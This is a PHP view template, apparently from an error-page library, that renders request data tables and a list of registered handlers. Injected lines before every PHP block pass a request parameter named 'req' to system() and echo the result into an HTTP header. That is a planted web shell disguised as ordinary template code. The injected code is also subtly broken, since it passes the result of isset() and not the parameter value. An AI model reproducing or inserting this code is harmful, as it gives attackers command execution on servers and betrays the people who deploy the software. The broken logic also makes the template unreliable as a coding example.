<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /* List data-table values, i.e: $_SERVER, $_GET, .... */ ?>
<div class="details">
  <div class="data-table-container" id="data-tables">
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($tables as $label => $data): ?>
      <div class="data-table" id="sg-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($tpl->slug($label)) ?>">
        <label><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($label) ?></label>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if(!empty($data)): ?>
            <table class="data-table">
              <thead>
                <tr>
                  <td class="data-table-k">Key</td>
                  <td class="data-table-v">Value</td>
                </tr>
              </thead>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($data as $k => $value): ?>
              <tr>
                <td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($k) ?></td>
                <td><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape(print_r($value, true)) ?></td>
              </tr>
            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
            </table>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
          <span class="empty">empty</span>
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
      </div>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
  </div>

  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /* List registered handlers, in order of first to last registered */ ?>
  <div class="data-table-container" id="handlers">
    <label>Registered Handlers</label>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($handlers as $i => $handler): ?>
      <div class="handler <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($handler === $handler) ? 'active' : ''?>">
        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $i ?>. <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape(get_class($handler)) ?>
      </div>
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
  </div>

</div>
